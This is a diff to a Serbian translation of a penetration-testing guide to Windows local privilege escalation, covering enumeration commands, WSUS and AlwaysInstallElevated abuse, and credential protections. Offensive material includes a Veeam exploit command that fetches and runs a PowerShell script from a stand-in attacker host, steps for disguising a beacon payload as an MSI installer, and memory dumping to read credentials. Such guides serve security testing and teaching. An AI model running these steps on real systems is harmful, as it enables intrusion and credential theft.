@@ -1,12 +1,12 @@
-# Windows Local Privilege Escalation
+# Windows lokalno povišavanje privilegija
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### **Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Najbolji alat za pronalaženje vektora za Windows lokalno povišavanje privilegija:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-## Initial Windows Theory
+## Uvodna teorija za Windows
 
-### Access Tokens
+### Tokeni pristupa (Access Tokens)
 
 **Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**
 
@@ -24,29 +24,29 @@ access-tokens.md
 acls-dacls-sacls-aces.md
 {{#endref}}
 
-### Integrity Levels
+### Nivoi integriteta (Integrity Levels)
 
-**Ako ne znate šta su integrity levels in Windows, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**
+**Ako ne znate šta su nivoi integriteta u Windows-u, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-## Windows Security Controls
+## Kontrole bezbednosti u Windows-u
 
-Postoje različite stvari u Windows koje mogu **sprečiti da enumerišete sistem**, pokrenete izvršne fajlove ili čak **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **obrambene mehanizme** pre nego što započnete privilege escalation enumeration:
+Postoje različite stvari u Windows-u koje mogu **sprečiti vas da enumerišete sistem**, pokrenete izvršne fajlove ili čak **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **izenumerišete** sve ove **mehanizme odbrane** pre nego što započnete enumeraciju za povišavanje privilegija:
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
-## System Info
+## Informacije o sistemu
 
-### Version info enumeration
+### Enumeracija informacija o verziji
 
-Proverite da li Windows verzija ima neku poznatu ranjivost (takođe proverite i primenjene zakrpe).
+Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -59,16 +59,16 @@ wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architec
 Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
-### Eksploiti po verziji
+### Version Exploits
 
-Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretraživanje detaljnih informacija o Microsoft sigurnosnim ranjivostima. Ova baza sadrži više od 4.700 sigurnosnih ranjivosti, pokazujući **ogromnu površinu napada** koju predstavlja Windows okruženje.
+Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft security vulnerabilities. Ova baza podataka sadrži više od 4.700 security vulnerabilities, pokazujući **massive attack surface** koje Windows okruženje predstavlja.
 
 **Na sistemu**
 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima watson ugrađen)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
 
 **Lokalno sa informacijama o sistemu**
 
@@ -83,13 +83,13 @@ Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan z
 
 ### Okruženje
 
-Da li su neki credential/Juicy podaci sačuvani u env variables?
+Ima li bilo kakvih credential/Juicy info sačuvanih u env variables?
 ```bash
 set
 dir env:
 Get-ChildItem Env: | ft Key,Value -AutoSize
 ```
-### PowerShell istorija
+### PowerShell Istorija
 ```bash
 ConsoleHost_history #Find the PATH where is saved
 
@@ -101,7 +101,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 ### PowerShell Transcript fajlovi
 
-Možete saznati kako da omogućite ovo na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
+Možete naučiti kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
 ```bash
 #Check is enable in the registry
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
@@ -116,39 +116,39 @@ Stop-Transcript
 ```
 ### PowerShell Module Logging
 
-Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i izlazni rezultati možda neće biti zabeleženi.
+Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, kompletni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.
 
-Da biste ovo omogućili, pratite uputstva u odeljku "Transcript files" dokumentacije, i odaberite **"Module Logging"** umesto **"Powershell Transcription"**.
+Da biste ovo omogućili, pratite uputstva u odeljku "Transcript files" dokumentacije, birajući **"Module Logging"** umesto **"Powershell Transcription"**.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 ```
-Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:
+Da biste videli poslednjih 15 događaja iz PowersShell logova, možete izvršiti:
 ```bash
 Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-Kompletan zapis aktivnosti i puni sadržaj izvršavanja skripte se beleže, čime se osigurava da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan audit trail svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem cele aktivnosti u trenutku izvršavanja dobijaju se detaljni uvidi u proces.
+Zabeležena je potpuna evidencija aktivnosti i sadržaja izvršavanja skripte, čime se osigurava da je svaki blok koda dokumentovan tokom izvršavanja. Ovaj proces čuva sveobuhvatan audit trail svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem celokupne aktivnosti u trenutku izvršavanja dobijaju se detaljni uvidi u proces.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Zapisi događaja za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
-Za pregled poslednjih 20 događaja možete koristiti:
+Zabeleženi događaji za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
+Za prikaz poslednjih 20 događaja možete koristiti:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
-### Internet podešavanja
+### Podešavanja interneta
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
-### Diskovi
+### Pogoni
 ```bash
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
@@ -156,9 +156,9 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 ## WSUS
 
-Možete kompromitovati sistem ako ažuriranja nisu zahtevana koristeći http**S** već http.
+Možete kompromitovati sistem ako se ažuriranja ne zahtevaju koristeći http**S**, već http.
 
-Počnite proverom da li mreža koristi non-SSL WSUS update pokretanjem sledeće komande u cmd:
+Počinjete proverom da li mreža koristi non-SSL WSUS update pokretanjem sledećeg u cmd:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
@@ -166,7 +166,7 @@ Ili sledeće u PowerShell-u:
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
-Ako dobijete odgovor poput jednog od ovih:
+Ako dobijete odgovor kao neki od ovih:
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
@@ -180,11 +180,11 @@ PSChildName  : windowsupdate
 PSDrive      : HKLM
 PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
-A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.
+A ako `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ima vrednost `1`.
 
-Tada, **it is exploitable.** Ako je poslednja vrednost registra jednaka 0, unos WSUS će biti ignorisан.
+Tada je **eksploatabilno.** Ako poslednji registry ima vrednost `0`, unos za WSUS će biti ignorisan.
 
-Da biste iskoristili ovu ranjivost možete koristiti alate kao: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ovo su weaponized MiTM exploit skripte za injektovanje 'lažnih' ažuriranja u non-SSL WSUS saobraćaj.
+Da biste iskoristili ovu ranjivost možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ovo su MiTM weaponized exploit skripte za ubacivanje 'fake' ažuriranja u non-SSL WSUS saobraćaj.
 
 Read the research here:
 
@@ -195,34 +195,44 @@ CTX_WSUSpect_White_Paper (1).pdf
 **WSUS CVE-2020-1013**
 
 [**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
-U suštini, ovo je propust koji ovaj bug iskorišćava:
+Basically, this is the flaw that this bug exploits:
 
-> Ako imamo mogućnost da izmenimo proxy za lokalnog korisnika, i Windows Updates koristi proxy koji je podešen u Internet Explorer’s settings, možemo pokrenuti [PyWSUS](https://github.com/GoSecure/pywsus) lokalno da presretnemo sopstveni saobraćaj i pokrenemo kod kao povišeni korisnik na našem sistemu.
+> Ako imamo mogućnost da izmenimo proxy lokalnog korisnika, i Windows Updates koristi proxy konfigurisan u Internet Explorer podešavanjima, tada imamo mogućnost da lokalno pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) da presretnemo sopstveni saobraćaj i izvršavamo kod kao povišeni korisnik na našem sistemu.
 >
-> Nadalje, pošto WSUS servis koristi podešavanja trenutnog korisnika, on će takođe koristiti njegov certificate store. Ako generišemo self-signed certificate za WSUS hostname i dodamo taj certificate u certificate store trenutnog korisnika, bićemo u mogućnosti da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi HSTS-like mehanizme za implementaciju trust-on-first-use tipa validacije sertifikata. Ako je predstavljen sertifikat trusted by the user i ima ispravan hostname, biće prihvaćen od strane servisa.
+> Nadalje, pošto WSUS servis koristi podešavanja trenutnog korisnika, on će koristiti i njegov store sertifikata. Ako generišemo self-signed sertifikat za WSUS hostname i dodamo taj sertifikat u store sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi HSTS-like mehanizme za implementaciju trust-on-first-use tip validacije sertifikata. Ako je predstavljeni sertifikat poverljiv korisniku i ima ispravan hostname, biće prihvaćen od strane servisa.
 
-Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
+You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
 
 ## Third-Party Auto-Updaters and Agent IPC (local privesc)
 
-Mnogi enterprise agenti izlažu localhost IPC surface i privilegovan update kanal. Ako se enrollment može prisiliti na attacker server i updater veruje rogue root CA ili ima weak signer checks, lokalni korisnik može dostaviti malicious MSI koji SYSTEM servis instalira. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc chain – CVE-2025-0309) ovde:
+Mnogi enterprise agenti izlažu localhost IPC interfejs i privilegovani update kanal. Ako se registracija (enrollment) može preusmeriti na server napadača, i updater veruje rogue root CA ili ima slabe provere potpisivača, lokalni korisnik može isporučiti maliciozni MSI koji SYSTEM servis instalira. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309) ovde:
 
 
 {{#ref}}
 abusing-auto-updaters-and-ipc.md
 {{#endref}}
 
+## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
+
+Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, omogućavajući proizvoljna komandna izvršenja kao **NT AUTHORITY\SYSTEM**.
+
+- **Recon**: potvrdite listener i verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Exploit**: postavite PoC kao što je `VeeamHax.exe` sa potrebnim Veeam DLL-ovima u isti direktorijum, zatim pokrenite SYSTEM payload preko lokalnog socket-a:
+```powershell
+.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
+```
+Servis izvršava komandu kao SYSTEM.
 ## KrbRelayUp
 
-A **local privilege escalation** vulnerability postoji u Windows **domain** okruženjima pod specifičnim uslovima. Ti uslovi uključuju okruženja gde **LDAP signing is not enforced,** korisnici imaju prava da konfigurišu **Resource-Based Constrained Delegation (RBCD),** i mogućnost da korisnici kreiraju računare u domenu. Važno je napomenuti da se ovi **requirements** zadovoljavaju korišćenjem **default settings**.
+Postoji ranjivost **local privilege escalation** u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja gde je **LDAP signing is not enforced,** korisnici poseduju prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** i mogućnost da korisnici kreiraju računare unutar domena. Važno je napomenuti da se ovi **zahtevi** zadovoljavaju korišćenjem **podrazumevanih podešavanja**.
 
-Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+Pronađite **exploit** na [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
+Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
 
 ## AlwaysInstallElevated
 
-**If** ove 2 vrednosti registra su **enabled** (vrednost je **0x1**), onda korisnici bilo kog privilegija mogu **install** (izvršiti) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
+**Ako** su ova 2 ključa u registru **omogućena** (vrednost je **0x1**), onda korisnici bilo kog privilegijskog nivoa mogu **instalirati** (izvršiti) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -236,15 +246,15 @@ Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modu
 
 ### PowerUP
 
-Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
+Koristite komandu `Write-UserAddMSI` iz PowerUP-a da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript ispiše unapred kompajlovani MSI instaler koji traži dodavanje korisnika/grupe (tako da će vam trebati pristup GUI-ju):
 ```
 Write-UserAddMSI
 ```
-Samo pokrenite kreirani binarni fajl da biste izvršili eskalaciju privilegija.
+Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.
 
 ### MSI Wrapper
 
-Pročitajte ovaj tutorijal da naučite kako napraviti MSI wrapper koristeći ove alate. Imajte na umu da možete zapakovati "**.bat**" fajl ako **samo** želite **izvršavati** **komandne linije**
+Pročitajte ovaj tutorijal da naučite kako da napravite MSI wrapper koristeći ove alate. Obratite pažnju da možete umotati "**.bat**" fajl ako **samo** želite da **izvršavate** **komandne linije**
 
 
 {{#ref}}
@@ -260,44 +270,44 @@ create-msi-with-wix.md
 
 ### Create MSI with Visual Studio
 
-- **Generišite** pomoću Cobalt Strike ili Metasploit **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
-- Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
-- Dajte projektu ime, na primer **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
-- Nastavite da klikćete **Next** dok ne stignete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
+- **Generišite** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
+- Otvorite **Visual Studio**, izaberite **Create a new project** i otkucajte "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
+- Dajte projektu ime, npr. **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
+- Nastavite da klikćete **Next** dok ne dođete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
 - Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
-- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti da instalirana aplikacija izgleda legitimnije.
-- Kliknite desnim tasterom na projekat i izaberite **View > Custom Actions**.
-- Kliknite desnim tasterom na **Install** i izaberite **Add Custom Action**.
-- Dvaput kliknite na **Application Folder**, izaberite svoj fajl **beacon.exe** i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se installer pokrene.
+- Postoje i druge opcije koje možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti da instalirana aplikacija izgleda legitimnije.
+- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
+- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
+- Dvaput kliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se installer pokrene.
 - U okviru **Custom Action Properties**, promenite **Run64Bit** na **True**.
-- Na kraju, **build it**.
+- Na kraju, **izgradite projekat**.
 - Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, uverite se da ste postavili platformu na x64.
 
 ### MSI Installation
 
-Da biste izvršili **instalaciju** malicioznog `.msi` fajla u pozadini:
+Za izvršavanje **instalacije** zlonamernog `.msi` fajla u **pozadini:**
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
-Da biste iskoristili ovu ranjivost možete koristiti: _exploit/windows/local/always_install_elevated_
+Za exploit ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_
 
 ## Antivirus i detektori
 
 ### Podešavanja audita
 
-Ova podešavanja odlučuju šta se **beleži**, pa obratite pažnju
+Ova podešavanja određuju šta se **logged**, zato treba da obratite pažnju
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 ### WEF
 
-Windows Event Forwarding, zanimljivo je znati gde se logovi šalju
+Windows Event Forwarding — zanimljivo je znati gde se šalju logovi.
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 ### LAPS
 
-**LAPS** je dizajniran za **upravljanje lokalnim Administrator lozinkama**, osiguravajući da je svaka lozinka **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domeni. Ove lozinke su bezbedno pohranjene u Active Directory i mogu im pristupiti samo korisnici kojima su putem ACLs dodeljena odgovarajuća ovlašćenja, omogućavajući im pregled lokalnih admin lozinki ako su ovlašćeni.
+**LAPS** je dizajniran za **management of local Administrator passwords**, obezbeđujući da je svaka lozinka **jedinstvena, nasumična i redovno ažurirana** na računarima priključenim na domen. Te lozinke se bezbedno čuvaju u Active Directory i mogu im pristupiti samo korisnici kojima su dodeljena odgovarajuća dozvola putem ACLs, što im omogućava da pregledaju local admin passwords ako su ovlašćeni.
 
 
 {{#ref}}
@@ -306,37 +316,36 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-Ako je aktivan, **plain-text lozinke se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
-[**Više informacija o WDigest na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
+Ako je aktivno, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
+[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
 ### LSA zaštita
 
-Počevši od **Windows 8.1**, Microsoft je uveo pojačanu zaštitu za Lokalni sigurnosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili da ubacuju kod, dodatno osiguravajući sistem.\
-[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
+Počevši od **Windows 8.1**, Microsoft je uveo pojačanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubrizgavaju kod, dodatno osiguravajući sistem.\
+[**Više informacija o LSA zaštiti ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti credentials sačuvane na uređaju od pretnji kao što su pass-the-hash napadi.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti podatke za prijavu sačuvane na uređaju od pretnji poput pass-the-hash napada.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 ### Cached Credentials
 
-**Domain credentials** se autentifikuju od strane **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se korisnikovi logon podaci autentifikuju od strane registrovanog security package-a, domain credentials za korisnika su obično uspostavljeni.\
-
-[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials)
+**Domain credentials** se autentifikuju od strane **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada su podaci za logon korisnika autentifikovani od strane registrovanog security package-a, za korisnika se obično uspostavljaju domain credentials.\
+[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## Korisnici i Grupe
+## Korisnici i grupe
 
-### Enumerišite korisnike i grupe
+### Enumeracija korisnika i grupa
 
-Trebalo bi da proverite da li neke od grupa kojima pripadate imaju zanimljive dozvole
+Treba da proverite da li neke od grupa kojima pripadate imaju zanimljiva ovlašćenja
 ```bash
 # CMD
 net users %username% #Me
@@ -351,31 +360,31 @@ Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
-### Privilegovane grupe
+### Privileged groups
 
-**Ako pripadate nekoj privilegovanoj grupi, možda možete eskalirati privilegije**. Saznajte o privilegovanim grupama i kako ih zloupotrebiti za eskalaciju privilegija ovde:
+Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte o privilegovanim grupama i kako ih zloupotrebiti da biste eskalirali privilegije ovde:
 
 
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
 
-### Token manipulacija
+### Token manipulation
 
 **Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
-Pogledajte sledeću stranicu da **learn about interesting tokens** i kako ih zloupotrebiti:
+Pogledajte sledeću stranicu da biste **saznali o zanimljivim tokens** i kako ih zloupotrebiti:
 
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Prijavljeni korisnici / Sesije
+### Prijavljeni korisnici / sesije
 ```bash
 qwinsta
 klist sessions
 ```
-### Korisnički direktorijumi
+### Kućni direktorijumi
 ```bash
 dir C:\Users
 Get-ChildItem C:\Users
@@ -390,10 +399,10 @@ powershell -command "Get-Clipboard"
 ```
 ## Pokrenuti procesi
 
-### Dozvole fajlova i direktorijuma
+### Dozvole fajlova i foldera
 
-Prvo, pri listanju procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
-Proverite da li možete **prepisati neki pokrenuti binarni fajl** ili da li imate dozvole za pisanje u direktorijumu binarnih fajlova kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
+Prvo, pri listanju procesa, **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
+Proverite da li možete **prepisati neki pokrenuti binarni fajl** ili da li imate permisije za pisanje u folderu binarnih fajlova da biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -404,7 +413,7 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Uvek proverite da li postoje [**electron/cef/chromium debuggers** koji su pokrenuti — možete ih zloupotrebiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Uvek proverite da li su mogući [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
 **Provera dozvola binarnih fajlova procesa**
 ```bash
@@ -415,7 +424,7 @@ icacls "%%z"
 )
 )
 ```
-**Provera dozvola foldera koji sadrže binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
+**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -425,19 +434,19 @@ todos %username%" && echo.
 ```
 ### Memory Password mining
 
-Možete napraviti memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi kao FTP često imaju **credentials in clear text in memory** — pokušajte da dump-ujete memoriju i pročitate credentials.
+Možete napraviti dump memorije pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi poput FTP-a imaju **credentials in clear text in memory** — pokušajte napraviti dump memorije i pročitati credentials.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
-### Nezaštićene GUI aplikacije
+### Nesigurne GUI aplikacije
 
-**Aplikacije koje rade kao SYSTEM mogu omogućiti korisniku da pokrene CMD, ili pregledava direktorijume.**
+**Aplikacije koje rade kao SYSTEM mogu dozvoliti korisniku da pokrene CMD ili pregleda direktorijume.**
 
-Primer: "Windows Help and Support" (Windows + F1), potražite "command prompt", kliknite na "Click to open Command Prompt"
+Primer: "Windows Help and Support" (Windows + F1) — potražite "command prompt", kliknite na "Click to open Command Prompt"
 
 ## Servisi
 
-Service Triggers omogućavaju Windows da pokrene servis kada nastanu određeni uslovi (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane servise aktiviranjem njihovih triggera. Pogledajte tehnike enumeracije i aktivacije ovde:
